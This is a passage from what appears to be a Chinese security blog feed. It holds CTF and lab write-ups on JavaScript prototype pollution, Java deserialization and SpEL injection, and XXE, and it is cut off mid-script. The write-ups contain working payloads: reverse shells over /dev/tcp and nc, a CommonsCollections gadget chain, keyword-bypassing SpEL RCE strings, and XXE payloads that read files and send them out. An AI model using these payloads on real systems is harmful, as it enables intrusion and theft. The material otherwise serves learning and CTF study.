        <content type="html"><![CDATA[<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p><pre><code class="javascript">function Animal(){this.species = &quot;动物&quot;;}</code></pre><p>还有一个”猫”对象的构造函数。</p><pre><code class="JavaScript">function Cat(name,color){　　　　this.name = name;　　　　this.color = color;　　}</code></pre><p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p><p>但是在JavaScript中，</p><pre><code class="javascript">Cat.prototype = new Animal();Cat.prototype.constructor = Cat;var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);alert(cat1.species); // 动物</code></pre><p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p><p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p><p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p><p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p><p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p><p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p><p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p><p><img src="/posts/5d5d07b8/1572246225198.png" alt></p><p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p><p>生成的<code>user</code>对象</p><p><img src="/posts/5d5d07b8/1572246345905.png" alt></p><p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p><p>查看<code>defaultsDeep</code>的例子：</p><pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p><p><img src="/posts/5d5d07b8/1572246569945.png" alt></p><p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p><p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p><p>思路就是通过原型链污染使得flag能被展示出来</p><p>渲染页面的主要部分如下：</p><pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({  id: k,  content: v.content,  public: v.public,})),</code></pre><p>exp</p><pre><code class="python">import requestsURL = &quot;http://localhost/&quot;user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})print(res.text)res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})print(res2.text)</code></pre><h3 id="新春战疫-ezexpress"><a href="#新春战疫-ezexpress" class="headerlink" title="新春战疫 ezexpress"></a>新春战疫 ezexpress</h3><p>用到了JavaScript的一个小trick</p><p>两个奇特的字符 ==”ı”、”ſ”。==</p><p> 这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p><p>绕过之后，就可以登陆,看到一个很显然的 <code>clone</code> 操作</p><pre><code class="js">router.post(&#39;/action&#39;, function (req, res) {  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)}   req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  });</code></pre><p>那么就可以污染属性了。污染哪个呢？</p><pre><code class="js">router.get(&#39;/&#39;, function (req, res) {  if(!req.session.user){    res.redirect(&#39;/login&#39;);  }  res.outputFunctionName=undefined;  res.render(&#39;index&#39;,data={&#39;user&#39;:req.session.user.user});});router.get(&#39;/info&#39;, function (req, res) {  res.render(&#39;index&#39;,data={&#39;user&#39;:res.outputFunctionName});})</code></pre><p>我们这里就直接污染 <code>res.outputFunctionName</code> </p><p>(测试的时候Windows下无法用nc弹shell)</p><p><img src="/posts/5d5d07b8/1583322699980.png" alt></p><p>然后访问 info 页面即可</p><p>原来的payload</p><pre><code class="json">{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;}}</code></pre><h3 id="HGAME"><a href="#HGAME" class="headerlink" title="HGAME"></a>HGAME</h3><p>这题也是JavaScript原型链污染，不过这里更明显</p><pre><code class="js">if (sekiro.attackInfo.additionalEffect) {    var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)    sekiro = fn(sekiro)}</code></pre><p><code>Function</code> 是动态构造函数</p><p>payload</p><pre><code class="json"> {&quot;solution&quot;:&quot;1&quot;,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc vps-ip port -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p><img src="/posts/5d5d07b8/1583323453485.png" alt></p><p>然后vps上即可监听到请求(当然我这里只是nc一下)</p><p>写到这里突然又想起来了 2019XNUCA的一道JavaScript原型链污染的题目</p><h3 id="2019-XNUCA-hardjs"><a href="#2019-XNUCA-hardjs" class="headerlink" title="2019 XNUCA hardjs"></a>2019 XNUCA hardjs</h3><p>(盗了一张图过来)</p><p>能够RCE的点出在 <code>res.render</code> 处，具体的就不分析了，这里是最后的变量拼接的地方</p><p><img src="/posts/5d5d07b8/j_3.png" alt></p><p>从这里可以看到有两个拼接的变量可以使用</p><p>于是就能够构造两个payload</p><pre><code class="json">{&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;client&quot;: true,&quot;escapeFunction&quot;: &quot;1; return process.env.FLAG&quot;,&quot;debug&quot;:true, &quot;compileDebug&quot;: true}}}}</code></pre><p>或者</p><pre><code class="json"> {    &quot;content&quot;: {        &quot;constructor&quot;: {            &quot;prototype&quot;: {            &quot;outputFunctionName&quot;:&quot;_tmp1;return process.env.FLAG;//;var __tmp2&quot;            }        }    },    &quot;type&quot;: &quot;test&quot;}</code></pre><p>当然要是想弹shell也不是不可以</p><pre><code class="json">{    &quot;content&quot;: {        &quot;constructor&quot;: {            &quot;prototype&quot;: {            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;            }        }    },    &quot;type&quot;: &quot;test&quot;}</code></pre><p>现在回顾起当时遇到这道题还啥都不会，现在又突然想起来的这种感觉好好玩</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6101#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101#toc-1</a></p><p><a href="http://passingfoam.com/2019/08/31/XNUCA-2019-web-复现/" target="_blank" rel="noopener">http://passingfoam.com/2019/08/31/XNUCA-2019-web-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://xz.aliyun.com/t/6113#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-5</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java审计笔记</title>
      <link href="/posts/21b61fbe/"/>
      <url>/posts/21b61fbe/</url>
      
        <content type="html"><![CDATA[<h2 id="反射相关概念"><a href="#反射相关概念" class="headerlink" title="反射相关概念"></a>反射相关概念</h2><p>正常执行一条命令</p><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>如果通过反射来执行：</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), &quot;calc&quot;);</code></pre><p><code>Runtime</code> 的构造方法是私有的，遵循单例模式，所以无法直接调用，但是可以通过调用静态方法 <code>getRuntime</code> 来获得一个 <code>Runtime</code> 对象，这个方法是静态的，并不需要传递类的实例进去(不然就陷入了死循环)，而调用之后返回的结果是一个 <code>Runtime</code> 对象，作为 <code>exec</code> 方法的第一个参数，这是因为 <code>exec</code> 方法不是静态方法</p><p>我们正常执行方法是 <code>[1].method([2], [3], [4]...)</code> ，其实在反射里就是 <code>method.invoke([1], [2], [3], [4]...)</code> </p><p>当然如果分解开来比较好理解一点:</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)//runtime.exec(&quot;calc&quot;) 即可Method method2 = clazz.getMethod(&quot;exec&quot;, String.class); //得到exec方法method2.invoke(runtime, &quot;calc&quot;); //调用exec方法</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>java的反序列化是通过<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>两个类来实现的，同时要序列化的类必须实现<code>Serializable</code>接口</p><p>与PHP类似，Java在序列化一个对象的时候会调用<code>writeObject</code>方法，在反序列化一个对象的时候会调用<code>readObject</code>方法</p><h2 id="Apache-CommonsCollections反序列化"><a href="#Apache-CommonsCollections反序列化" class="headerlink" title="Apache CommonsCollections反序列化"></a>Apache CommonsCollections反序列化</h2><p>只要弄懂了反射的逻辑，那么理解 <code>CommonsCollections</code> 的payload也就不难了,重点在构造 <code>transformers</code> 数组的时候</p><pre><code class="java">Transformer[] transformers = new Transformer[]{        new ConstantTransformer(Runtime.class),         new InvokerTransformer(&quot;getMethod&quot;, new Class[]{                String.class, Class[].class}, new Object[]{                &quot;getRuntime&quot;,null}),        new InvokerTransformer(&quot;invoke&quot;, new Class[]{                Object.class, Object[].class}, new Object[]{null,new Object[0]}),        new InvokerTransformer(&quot;exec&quot;, new Class[]{                String.class}, new Object[]{&quot;calc&quot;})};Transformer transformedChain = new ChainedTransformer(transformers);transformedChain.transform(transformers);  //触发</code></pre><p><code>transformers</code> 数组中的每一个对象都会调用一次 <code>transform</code> 函数，<code>ConstantTransformer</code> 直接返回了 <code>Runtime.class</code>  作为下一个 <code>transform</code> 的参数 等价于</p><pre><code>Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类</code></pre><p>之后 <code>InvokerTransformer</code> 的 <code>transform</code> 接收传过来的 <code>Runtime.class</code> 去调用其 <code>getMethod</code>方法，等价于</p><pre><code>Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法</code></pre><p>返回了一个 <code>Method</code>类型的作为下一次 <code>transform</code> 的参数，之后的过程就是分别调用 <code>invoke</code> 和 <code>exec</code> 方法，等价于</p><pre><code>Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)runtime.exec(&quot;calc&quot;)</code></pre><p>由于 <code>getRuntime</code> 方法是静态的， <code>invoke</code> 的时候第一个参数不必是类的实例，之后由于已经获取到了 <code>Runtime</code> 的实例就不再需要通过反射去获得 <code>exec</code> 方法再 <code>invoke</code> 了，省去了一点麻烦的步骤</p><p><code>getMethod</code> 和 <code>invoke</code> 方法的原型，所以我们在反射的时候也需要指定这些参数的class</p><pre><code class="java">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)public Object invoke(Object obj, Object... args)</code></pre><p>但是实际上我们在调用 <code>getMethod</code> 的时候，只需要指定第一个参数为 <code>getRuntime</code> 即可，那么第二个参数我们可以设为 null 或者 <code>new Class[0]</code> ，同理， invoke 方法这里不需要指定参数可以将两个参数都设置为 null</p><p>理解一下 <code>collections.map.TransformedMap</code> 这个类，提供了一个 <code>decorateTransform</code> 方法，可以将普通的map转化为 <code>TransformedMap</code> ，这个函数的原型</p><pre><code class="java">public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) </code></pre><p>第二个和第三个参数都是 <code>Transformer</code> 类型的，也就是每次更新map的时候，比如对map执行 put操作的时候</p><pre><code class="java">public Object put(Object key, Object value) {    key = transformKey(key);    value = transformValue(value);    return getMap().put(key, value);}</code></pre><p>会针对 key 和 value 执行 transform 操作</p><p>结合之前的 payload, 我们可以编写这个代码弹出计算器</p><pre><code class="java">public class Test {    public static void main(String[] args) {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                        String.class, Class[].class}, new Object[] {                        &quot;getRuntime&quot;, new Class[0]}),                new InvokerTransformer(&quot;invoke&quot;, new Class[] {                        Object.class, Object[].class }, new Object[] {                        null, null }),                new InvokerTransformer(&quot;exec&quot;, new Class[] {                        String.class }, new Object[] {&quot;calc.exe&quot;})};        Transformer transformedChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();         Map outMap = TransformedMap.decorate(innerMap, null, transformedChain); //转变为 TransformedMap 操作        outMap.put(&quot;key&quot;, &quot;value&quot;);//触发payload    }}</code></pre><p>但是网上给的payload都是针对 <code>setValue</code> 方法触发的payload，这是怎么找到的</p><p>经过调试我发现 <code>AbstractMapEntryDecorator</code> 实现了 <code>Map</code>，其中的  <code>setValue</code> 是这么写的</p><pre><code class="java">public Object setValue(Object object) {    return entry.setValue(object);}</code></pre><p>这个方法之后又被 <code>AbstractInputCheckedMapDecorator</code> 的内部 <code>MapEntry</code> 类重写</p><pre><code class="java">public Object setValue(Object value) {    value = parent.checkSetValue(value); //多了一次 checkSetValue 操作    return entry.setValue(value);}</code></pre><p>这个多出来的 <code>checkSetValue</code> 方法又是 <code>AbstractInputCheckedMapDecorator</code>  的，而 <code>TransformedMap</code> 正是重写了这个方法</p><p><img src="/posts/21b61fbe/1580461320232.png" alt></p><p>所以实际上是的结果是调用了 <code>TransformedMap</code> 的 <code>checkSetValue</code> 方法</p><pre><code class="java">protected Object checkSetValue(Object value) {    return valueTransformer.transform(value);}</code></pre><p>这样就能触发payload了</p><p>之后寻找能够触发 <code>setValue</code> 方法的类，这里利用了 <code>AnnotationInvocationHandler</code></p><p>不过这里只有jdk7才能运行，我开始用的jdk8不能成功</p><p>最后的测试代码</p><pre><code class="java">package com.alibaba.dubbo.demo;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.File;import java.io.FileOutputStream;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;import javax.management.ObjectInstance;import com.alibaba.dubbo.common.serialize.ObjectInput;/** * @description: 测试 * @author: Pxy * @create: 2020-01-31 16:21 **/public class Test {        public static void main(String[] args) throws Exception {            Transformer[] transformers = new Transformer[]{                    new ConstantTransformer(Runtime.class),                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                            String.class, Class[].class}, new Object[] {                            &quot;getRuntime&quot;, new Class[0]}),                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {                            Object.class, Object[].class }, new Object[] {                            null, new Object[0]}),                    new InvokerTransformer(&quot;exec&quot;, new Class[] {                            String.class }, new Object[] {&quot;calc.exe&quot;})};            Transformer transformedChain = new ChainedTransformer(transformers);            Map innerMap = new HashMap();            innerMap.put(&quot;key&quot;, &quot;value&quot;);            Map outMap = TransformedMap.decorate(innerMap, null, transformedChain);            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);            ctor.setAccessible(true);            Object instance = ctor.newInstance(Retention.class, outMap);            File f = new File(&quot;payload.bin&quot;);            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));            out.writeObject(instance);            out.flush();            out.close();            ObjectInputStream input = new ObjectInputStream(new FileInputStream(&quot;payload.bin&quot;));            input.readObject();            input.close();        }}</code></pre><p>先断在这个 <code>AnnotationInvocationHandler</code> 类中</p><p><img src="/posts/21b61fbe/1580469219896.png" alt></p><p>然后触发 <code>checkSetValue</code> 方法</p><p><img src="/posts/21b61fbe/1580469249634.png" alt="1580469249634"></p><p>最后成功弹出计算器</p><h2 id="SPEL表达式注入"><a href="#SPEL表达式注入" class="headerlink" title="SPEL表达式注入"></a>SPEL表达式注入</h2><p>类似于 jinja 表达式，不过更为强大</p><p>编写一个接口进行测试：</p><pre><code class="java">@GetMapping(&quot;/spel&quot;)public String spel(String input) throws  Exception{    SpelExpressionParser parser = new SpelExpressionParser();    Expression expression = (Expression)parser.parseExpression(input);    return expression.getValue().toString();}</code></pre><p>访问 <code>/spel?input=new java.lang.ProcessBuilder(&quot;calc&quot;).start()</code></p><p><img src="/posts/21b61fbe/1580468482834.png" alt></p><h2 id="code-breaking-javacon"><a href="#code-breaking-javacon" class="headerlink" title="code-breaking javacon"></a>code-breaking javacon</h2><p>这道题并不算难，结合了java反射和spel表达式注入</p><p>一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选</p><p><code>application.yml</code>中有一些相关的设置</p><pre><code class="yaml">keywords:  blacklist:     - java.+lang    - Runtime    - exec.*\(user:  username: admin  password: admin  rememberMeKey: c0dehack1nghere1</code></pre><p>有一个黑名单过滤了一些字符，不过可以很容易地用字符串拼接进行绕过</p><p>仔细分析代码，其中有存在一处类似模板渲染的语句</p><pre><code class="java">ParserContext parserContext = new TemplateParserContext();Expression exp = parser.parseExpression(val, parserContext);SmallEvaluationContext evaluationContext = new SmallEvaluationContext();return exp.getValue(evaluationContext).toString();</code></pre><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>这一处位于<code>getAdvanceValue</code>函数中，调用它的是这里：</p><pre><code class="java">@GetMappingpublic String admin(@CookieValue(value = &quot;remember-me&quot;, required = false) String rememberMeValue,                    HttpSession session,                    Model model) {    if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {        String username = userConfig.decryptRememberMe(rememberMeValue);        if (username != null) {            session.setAttribute(&quot;username&quot;, username);        }    }    Object username = session.getAttribute(&quot;username&quot;);    if(username == null || username.toString().equals(&quot;&quot;)) {        return &quot;redirect:/login&quot;;    }    model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));    return &quot;hello&quot;;}</code></pre><p>这里相当于是admin的管理界面，首先会检查<code>rememberMeValue</code>的值，并且尝试去解密其中的用户名，同时加入到<code>session</code>中，之后执行<code>model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));</code></p><p>那么这里的关键就是<code>cookie</code>中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造<code>rememberMeValue</code>来达到rce</p><p>首先需要一条java的反射链，因为要绕过一些关键字：</p><pre><code class="java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;calc&quot;)</code></pre><p>之后要将其构造成Spel表达式，就是增加一个<code>T()</code></p><p>先本地测试弹一个计算器</p><pre><code class="java">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;calc\&quot;})}&quot;)); //注意java的字符串必须是双引号</code></pre><p>生成payload</p><pre><code>bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8=</code></pre><p>之后登陆再替换掉cookie</p><p><img src="/posts/21b61fbe/1573973547431-1580346732870.png" alt="结果"></p><h2 id="fastjson-反序列化-仅复现"><a href="#fastjson-反序列化-仅复现" class="headerlink" title="fastjson 反序列化(仅复现)"></a>fastjson 反序列化(仅复现)</h2><p>docker开启环境之后，首先需要生成一个 <code>TouchFile</code> 恶意文件，然后编译成class文件</p><pre><code class="java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>用python开一个服务器，监听8001端口</p><p>再开启一个rmi服务器，靶机ip为192.168.99.100，本机相对靶机是192.168.99.1</p><p><img src="/posts/21b61fbe/1580469670376.png" alt></p><p>这时候将payload发送过去，payload只是演示了在 tmp 目录下创建文件</p><p><img src="/posts/21b61fbe/1580469645918.png" alt></p><p>创建成功</p><p><img src="/posts/21b61fbe/1580469708254.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/#h4.1_%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">Java反序列化漏洞通用利用分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE复习</title>
      <link href="/posts/2e545689/"/>
      <url>/posts/2e545689/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常用payload分析"><a href="#常用payload分析" class="headerlink" title="常用payload分析"></a>常用payload分析</h2><p>好像大家都用这个测试代码</p><pre><code class="php">&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents(&quot;php://input&quot;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);var_dump($creds);</code></pre><p>使用XML发送数据：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY a SYSTEM &quot;http://localhost:8887/aaaaa&quot;&gt;]&gt;&lt;root&gt;&amp;a;&lt;/root&gt;</code></pre><p>但是我在尝试参数实体的时候似乎不能外带数据</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY % a &quot;http://localhost:8887/aaa&quot;&gt;%a;]&gt;&lt;root&gt;&lt;/root&gt;</code></pre><p><img src="/posts/2e545689/1580302730124.png" alt></p><p>嵌套也是不行的</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>最常用的外带数据的方法：</p><p>在自己的vps上准备两个文件，我这里就就都在本机做的实验</p><p>本地的8001端口开一个web服务，</p><p><img src="/posts/2e545689/1580302833010-1580342074917.png" alt></p><p><code>local.xml</code> 文件内容：</p><pre><code class="xml">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;%start;</code></pre><p>这个文件表示读取到数据之后发送给另一个8887端口，然后我们向受害者服务器发送数据，</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;      &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.txt&quot;&gt;    %remote;    %send;]&gt;&lt;message&gt;1234&lt;/message&gt;</code></pre><p>然后就可以在8887端口接收到数据了</p><p><img src="/posts/2e545689/1580302962486-1580342120888.png" alt></p><p>换一种 <code>payload</code> 也行</p><p>DTD文件</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://localhost:8887/p=%file;&#39;&gt;&quot;&gt;</code></pre><p>发送的 paylod</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;%remote;%int;%send;]&gt;</code></pre><h2 id="报错XXE"><a href="#报错XXE" class="headerlink" title="报错XXE"></a>报错XXE</h2><p>这个方法p牛其实早就说过了,通过三层嵌套的XML就可以达到报错</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message ANY&gt;    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY % para &#39;        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;para2;    &#39;&gt;    %para;]&gt;&lt;message&gt;10&lt;/message&gt;</code></pre><p><img src="/posts/2e545689/1580303152983-1580342131433.png" alt></p><h2 id="XXE探测内网"><a href="#XXE探测内网" class="headerlink" title="XXE探测内网"></a>XXE探测内网</h2><pre><code class="xml">import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;    send_xml(xml)def send_xml(xml):    headers = {&#39;Content-Type&#39;: 